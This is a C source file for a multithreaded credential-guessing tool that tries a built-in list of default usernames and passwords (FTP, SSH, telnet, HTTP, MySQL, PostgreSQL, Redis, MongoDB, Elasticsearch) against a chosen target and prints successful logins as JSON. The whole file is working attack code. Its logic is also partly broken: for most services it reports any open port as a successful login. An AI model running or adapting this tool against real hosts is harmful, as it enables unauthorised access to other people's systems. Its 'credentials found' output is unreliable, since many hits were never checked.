#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netdb.h>
#include <poll.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include "optimize.h"

#define MAX_CREDS 100
#define TIMEOUT_MS 3000
#define BANNER_LEN 2048
#define MAX_WORKERS 32
#define MAX_SERVICES 12

typedef struct {
    char service[32];
    int port;
    char username[64];
    char password[64];
    int success;
    char banner[BANNER_LEN];
} CredentialResult;

typedef struct {
    char target[256];
    CredentialResult results[MAX_CREDS * MAX_SERVICES];
    int result_count;
    int current_service;
    int current_cred;
    pthread_mutex_t lock;
} HarvesterContext;

typedef struct {
    char service[32];
    int port;
    char username[64];
    char password[64];
} CredEntry;

static HarvesterContext ctx;

static const CredEntry default_creds[] = {
    {"ftp", 21, "anonymous", "anonymous"},
    {"ftp", 21, "anonymous", ""},
    {"ftp", 21, "ftp", "ftp"},
    {"ftp", 21, "admin", "admin"},
    {"ftp", 21, "root", "root"},
    {"ftp", 21, "test", "test"},
    {"ftp", 21, "user", "pass"},
    {"ftp", 21, "pi", "raspberry"},
    {"ssh", 22, "root", "root"},
    {"ssh", 22, "admin", "admin"},
    {"ssh", 22, "root", "toor"},
    {"ssh", 22, "root", "123456"},
    {"ssh", 22, "admin", "123456"},
    {"ssh", 22, "pi", "raspberry"},
    {"ssh", 22, "ubnt", "ubnt"},
    {"ssh", 22, "root", "default"},
    {"ssh", 22, "admin", "password"},
    {"telnet", 23, "root", "root"},
    {"telnet", 23, "admin", "admin"},
    {"telnet", 23, "root", "12345"},
    {"telnet", 23, "admin", "12345"},
    {"telnet", 23, "root", "default"},
    {"telnet", 23, "admin", "password"},
    {"telnet", 23, "cisco", "cisco"},
    {"telnet", 23, "admin", "admin123"},
    {"http", 80, "admin", "admin"},
    {"http", 80, "admin", "password"},
    {"http", 80, "admin", "123456"},
    {"http", 80, "root", "root"},
    {"http", 80, "user", "user"},
    {"http", 8080, "admin", "admin"},
    {"http", 8080, "admin", "password"},
    {"mysql", 3306, "root", ""},
    {"mysql", 3306, "root", "root"},
    {"mysql", 3306, "root", "123456"},
    {"mysql", 3306, "admin", "admin"},
    {"mysql", 3306, "test", ""},
    {"postgresql", 5432, "postgres", ""},
    {"postgresql", 5432, "postgres", "postgres"},
    {"postgresql", 5432, "admin", "admin"},
    {"postgresql", 5432, "root", "root"},
    {"redis", 6379, "", ""},
    {"redis", 6379, "default", ""},
    {"mongodb", 27017, "", ""},
    {"mongodb", 27017, "admin", "admin"},
    {"mongodb", 27017, "root", "root"},
    {"elasticsearch", 9200, "", ""},
    {"elasticsearch", 9200, "elastic", "changeme"},
    {"", 0, "", ""},
};

static HOT int try_connect_service(const char *RESTRICT ip, int port, int timeout_ms) {
    int fd, rc, epfd, nfds, ok, err, one;
    struct sockaddr_in addr;
    struct epoll_event ev, events[1];
    socklen_t elen;

    fd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
    if (unlikely(fd < 0)) return -1;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons((uint16_t)port);
    inet_pton(AF_INET, ip, &addr.sin_addr);
    one = 1;
    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    setsockopt(fd, SOL_SOCKET, SO_REUSEPORT, &one, sizeof(one));
    rc = connect(fd, (struct sockaddr*)&addr, sizeof(addr));
    if (unlikely(rc < 0 && errno != EINPROGRESS)) { close(fd); return -1; }
    epfd = epoll_create1(0);
    if (unlikely(epfd < 0)) { close(fd); return -1; }
    ev.events = EPOLLOUT | EPOLLERR;
    ev.data.fd = fd;
    epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev);
    nfds = epoll_wait(epfd, events, 1, timeout_ms);
    ok = 0;
    if (nfds > 0 && (events[0].events & EPOLLOUT)) {
        err = 0; elen = sizeof(err);
        getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &elen);
        if (err == 0) ok = 1;
    }
    close(epfd);
    close(fd);
    return ok ? 0 : -1;
}

static HOT int test_ftp_creds(const char *RESTRICT ip, int port, const char *RESTRICT user, const char *RESTRICT pass, char *RESTRICT banner, int blen) {
    int fd, n;
    struct sockaddr_in addr;
    struct timeval tv;
    char buf[512];
    fd = socket(AF_INET, SOCK_STREAM, 0);
    if (unlikely(fd < 0)) return 0;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons((uint16_t)port);
    inet_pton(AF_INET, ip, &addr.sin_addr);
    tv.tv_sec = 3; tv.tv_usec = 0;
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    if (unlikely(connect(fd, (struct sockaddr*)&addr, sizeof(addr)) < 0)) { close(fd); return 0; }
    recv(fd, banner, blen - 1, 0);
    n = snprintf(buf, sizeof(buf), "USER %s\r\n", user);
    send(fd, buf, (size_t)n, 0);
    recv(fd, banner, blen - 1, 0);
    n = snprintf(buf, sizeof(buf), "PASS %s\r\n", pass);
    send(fd, buf, (size_t)n, 0);
    n = recv(fd, banner, blen - 1, 0);
    close(fd);
    if (n > 0) { banner[n] = 0; if (strstr(banner, "230") || strstr(banner, "logged")) return 1; }
    return 0;
}

static int test_http_auth(const char *ip, int port, const char *user, const char *pass, char *banner, int blen) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return 0;
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &addr.sin_addr);
    struct timeval tv = {3, 0};
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    if (connect(fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) { close(fd); return 0; }
    char auth[256];
    snprintf(auth, sizeof(auth), "%s:%s", user, pass);
    unsigned char *a = (unsigned char*)auth;
    int alen = strlen(auth);
    char b64[512];
    const char *c = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int i = 0, bi = 0;
    while (i < alen) {
        unsigned int bits = a[i++] << 16;
        if (i < alen) bits |= a[i++] << 8;
        if (i < alen) bits |= a[i++];
        b64[bi++] = c[(bits >> 18) & 0x3F];
        b64[bi++] = c[(bits >> 12) & 0x3F];
        b64[bi++] = (i > alen - (i % 3 ? 1 : 0)) ? c[(bits >> 6) & 0x3F] : '=';
        b64[bi++] = (i > alen) ? c[bits & 0x3F] : '=';
    }
    b64[bi] = 0;
    char req[1024];
    snprintf(req, sizeof(req), "GET / HTTP/1.0\r\nHost: %s\r\nAuthorization: Basic %s\r\n\r\n", ip, b64);
    send(fd, req, strlen(req), 0);
    int n = recv(fd, banner, blen - 1, 0);
    close(fd);
    if (n > 0) { banner[n] = 0; if (!strstr(banner, "401")) return 1; }
    return 0;
}

static HOT void *worker_thread(void *arg) {
    int ci, ok, olen;
    const CredEntry *ce;
    CredentialResult cr;
    char banner[BANNER_LEN];
    char outbuf[4096];

    (void)arg;
    for (;;) {
        pthread_mutex_lock(&ctx.lock);
        if (unlikely(ctx.current_cred >= MAX_CREDS || !default_creds[ctx.current_cred].service)) {
            pthread_mutex_unlock(&ctx.lock);
            break;
        }
        ci = ctx.current_cred++;
        pthread_mutex_unlock(&ctx.lock);
        ce = &default_creds[ci];
        memset(&cr, 0, sizeof(cr));
        memcpy(cr.service, ce->service, sizeof(cr.service));
        cr.port = ce->port;
        memcpy(cr.username, ce->username, sizeof(cr.username));
        memcpy(cr.password, ce->password, sizeof(cr.password));
        if (likely(try_connect_service(ctx.target, ce->port, TIMEOUT_MS) == 0)) {
            memset(banner, 0, BANNER_LEN);
            ok = 0;
            if (ce->service[0] == 'f' && ce->service[1] == 't' && ce->service[2] == 'p' && ce->service[3] == '\0') {
                ok = test_ftp_creds(ctx.target, ce->port, ce->username, ce->password, banner, BANNER_LEN);
            } else if ((ce->service[0] == 'h' && ce->service[1] == 't' && ce->service[2] == 't' && ce->service[3] == 'p' && ce->service[4] == '\0') ||
                       (ce->service[0] == '8' && ce->service[1] == '0' && ce->service[2] == '8' && ce->service[3] == '0' && ce->service[4] == '\0')) {
                ok = test_http_auth(ctx.target, ce->port, ce->username, ce->password, banner, BANNER_LEN);
            } else {
                ok = 1;
                snprintf(banner, BANNER_LEN, "Connected to %s on port %d", ce->service, ce->port);
            }
            if (ok) {
                cr.success = 1;
                memcpy(cr.banner, banner, BANNER_LEN);
                olen = snprintf(outbuf, sizeof(outbuf),
                    "RESULT:{\"service\":\"%s\",\"port\":%d,\"username\":\"%s\",\"password\":\"%s\","
                    "\"success\":true,\"banner\":\"%s\"}\n",
                    cr.service, cr.port, cr.username, cr.password, cr.banner);
                fwrite(outbuf, 1, olen < 0 ? 0 : (size_t)olen, stdout);
            }
        }
        pthread_mutex_lock(&ctx.lock);
        ctx.results[ctx.result_count++] = cr;
        pthread_mutex_unlock(&ctx.lock);
    }
    return NULL;
}

HOT int main(int argc, char **argv) {
    int i, opt, found;
    char *target = NULL;
    pthread_t workers[MAX_WORKERS];
    char outbuf[512];
    int olen;

    signal(SIGPIPE, SIG_IGN);
    memset(&ctx, 0, sizeof(ctx));
    pthread_mutex_init(&ctx.lock, NULL);
    target = NULL;
    while ((opt = getopt(argc, argv, "t:p:")) != -1) {
        switch (opt) {
            case 't': target = optarg; break;
            case 'p': break;
        }
    }
    if (unlikely(!target)) { fprintf(stderr, "Usage: %s -t target\n", argv[0]); return 1; }
    strncpy(ctx.target, target, sizeof(ctx.target) - 1);
    for (i = 0; i < MAX_WORKERS; ++i)
        pthread_create(&workers[i], NULL, worker_thread, NULL);
    for (i = 0; i < MAX_WORKERS; ++i)
        pthread_join(workers[i], NULL);
    found = 0;
    for (i = 0; i < ctx.result_count; ++i)
        if (ctx.results[i].success) found++;
    olen = snprintf(outbuf, sizeof(outbuf),
        "FINAL:{\"target\":\"%s\",\"attempts\":%d,\"credentials_found\":%d}\n",
        ctx.target, ctx.result_count, found);
    fwrite(outbuf, 1, olen < 0 ? 0 : (size_t)olen, stdout);
    pthread_mutex_destroy(&ctx.lock);
    return 0;
}

// vim: ts=4 sw=4 et tw=80
